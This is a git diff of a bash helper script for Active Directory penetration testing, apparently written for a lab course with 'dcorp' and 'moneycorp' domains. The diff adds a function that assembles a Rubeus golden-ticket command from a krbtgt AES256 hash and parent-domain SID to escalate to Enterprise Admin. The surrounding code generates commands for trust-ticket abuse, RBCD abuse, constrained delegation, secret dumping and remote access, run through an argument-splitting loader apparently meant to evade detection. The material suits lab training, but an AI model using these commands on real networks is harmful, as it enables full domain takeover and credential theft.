@@ -38,8 +38,8 @@ nb-ad-pwsh-rbcd                resource-based constrained delegation
 
 Privilege Escalation to Enterprise Admins
 -----------------------------------------
-nb-ad-pwsh-trust-tickets       across trusts - child to parent using trust tickets
-nb-ad-pwsh-krbtgt-hash         across trusts - child to parent using krbtgt hash
+nb-ad-pwsh-ea-trust-tickets       across trusts - child to parent using trust tickets
+nb-ad-pwsh-ea-krbtgt-hash         across trusts - child to parent using krbtgt hash
 
 Domain Persistence
 ------------------
@@ -59,12 +59,46 @@ nb-ad-cmd-ping                 sweep a network subnet with ping requests on wind
 DOC
 }
 
-nb-ad-pwsh-krbtgt-hash() {
+nb-ad-pwsh-ea-krbtgt-hash() {
     __check-project
 
+    __warn "You must use an elevated command prompt."
+    echo
+
+    __ask "Enter the current Domain name"
+    nb-vars-set-domain
+    __ask "Enter the Parent Domain name"
+    local dom && __askvar dom PARENT_DOMAIN
+    __ask "Enter the Domain SID of the current domain"
+    local sid1 && __askvar sid1 DomainSID
+    __ask "Enter the Domain SID of the parent domain"
+    local sid2 && __askvar sid2 ParentDomainSID
+    __ask "Enter the hostname of parent DC"
+    local hostname && __askvar hostname HOSTNAME
+    __ask "Enter the netbios name ex. dcorp"
+    local nb && __askvar nb NETBIOS_NAME
+    __ask "Enter the krbtgt's AES256 hash"
+    __check-hash
+
+    echo
+    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __ok "golden"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:Administrator /id:500 /domain:${__DOMAIN} /sid:$sid1 /sids:$sid2 /aes256:${__HASH} /netbios:$nb /ptt"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    __info "Check if we can access the parent domain machine with command:"
+    __ok "nb-ad-cmd-winrs"
 }
 
-nb-ad-pwsh-trust-tickets() {
+nb-ad-pwsh-ea-trust-tickets() {
     __check-project
 
     __warn "You must use an elevated command prompt."
@@ -109,6 +143,9 @@ nb-ad-pwsh-trust-tickets() {
     echo
     __info "To use the ticket with Rubeus:"
     __ok "C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /ticket:C:\\\\AD\\\\Tools\\\\trust_tkt.kirbi /service:cifs/$hostname.$dom /dc:$hostname.$dom /ptt"
+    echo
+    __info "Check if we can access the parent domain machine:"
+    __ok "dir \\\\mcorp-dc.moneycorp.local\\c$"
 }
 
 nb-ad-pwsh-rbcd() {
@@ -128,7 +165,7 @@ nb-ad-pwsh-rbcd() {
     __ask "Enter my windows machine's hostname to give myself write permissions"
     local hostname2 && __askvar hostname2 HOSTNAME
     echo
-    __info "Command to set RBCD on dcorp-mgmt for the student:"
+    __info "Command to set RBCD on target machine for the student:"
     __ok "Set-DomainRBCD -Identity ${hostname} -DelegateFrom '${hostname2}$' -Verbose"
     echo
     __info "You can check if RBCD is set correctly:"
@@ -143,10 +180,10 @@ nb-ad-pwsh-rbcd() {
     __warn "Encode the following command with: .\\ArgSplit.bat:"
     __ok "s4u"
     echo
-    __info "Now, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator"
+    __info "Now, abuse the RBCD to access target machine as Domain Administrator - Administrator"
     __ok "C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:$hostname2\$ /aes256:${__HASH} /msdsspn:http/$hostname /impersonateuser:administrator /ptt"
     echo
-    __info "Check if we can access dcorp-mgmt with command:"
+    __info "Check if we can access target machine with command:"
     __ok "nb-ad-cmd-winrs"
 }
 
@@ -172,7 +209,7 @@ nb-ad-pwsh-constrained-machine() {
 
     echo "$__COMMAND" | wl-copy
     echo
-    __info "Command to Abuse Constrained Delegation using ${__USER} copied to clipboard"
+    __info "Command to Abuse Constrained Delegation using ${__USER} copied to clipboard:"
     __ok "$__COMMAND"
     echo
     __info "Now run the dcsync command to abuse the LDAP ticket:"
@@ -556,7 +593,7 @@ nb-ad-pwsh-dump-secrets() {
 
     echo "$__COMMAND" | wl-copy
     echo
-    __info "Command copied to clipboard"
+    __info "Command copied to clipboard:"
     __ok "$__COMMAND"
 }
 
@@ -633,7 +670,7 @@ nb-ad-pwsh-psremoting() {
     if [[ $login == "l" ]]; then
       __COMMAND="Enter-PSSession -ComputerName ${__RHOST}"
       echo $__COMMAND | wl-copy
-      __info "Command copied to clipboard"
+      __info "Command copied to clipboard:"
       __ok "$__COMMAND"
       echo
       __info "Situational awareness:"
@@ -642,7 +679,7 @@ nb-ad-pwsh-psremoting() {
     elif [[ $login == "c" ]]; then
       __COMMAND="Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName ${__RHOST}"
       echo $__COMMAND | wl-copy
-      __info "Command copied to clipboard"
+      __info "Command copied to clipboard:"
       __ok "$__COMMAND"
     else
       echo
@@ -670,7 +707,7 @@ nb-ad-cmd-winrs() {
     elif [[ $login == "c" ]]; then
       __COMMAND="winrs -r:${__RHOST} cmd /c \"set computername && set username\""
       echo $__COMMAND | wl-copy
-      __info "Command copied to clipboard"
+      __info "Command copied to clipboard:"
     else
       echo
       __err "Invalid option. Please choose 'l' for login or 'c' for checking access."
